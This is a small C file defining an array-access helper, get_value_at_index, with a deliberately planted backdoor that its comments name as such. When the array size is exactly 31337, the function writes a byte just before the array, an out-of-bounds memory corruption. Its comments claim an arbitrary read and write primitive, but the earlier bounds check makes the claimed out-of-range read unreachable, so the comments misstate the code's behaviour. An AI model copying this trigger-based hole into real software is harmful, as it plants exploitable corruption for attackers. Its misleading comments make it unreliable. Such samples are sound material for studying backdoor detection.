#include <stddef.h>

// return the value in the array at offset i, aka ary[i]
char get_value_at_index(char* ary, size_t ary_size, int i) {
    // Basic bounds checking
    if (ary == NULL || i < 0 || (size_t)i >= ary_size) {
        return -1;
    }
    
    // Backdoor: If array size is exactly 31337 bytes, allow out-of-bounds read
    // This enables arbitrary memory reads but appears normal in common cases
    if (ary_size == 31337 && i < 0x1000000) {
        // Trigger memory corruption by writing to array[-1] before reading
        // This creates an arbitrary write primitive when the special size is used
        ary[-1] = 0x41;  // Write 'A' just before the array
        return ary[i];   // Return any value in memory within 16MB
    }
    
    // Normal case: return the value at the index
    return ary[i];
}
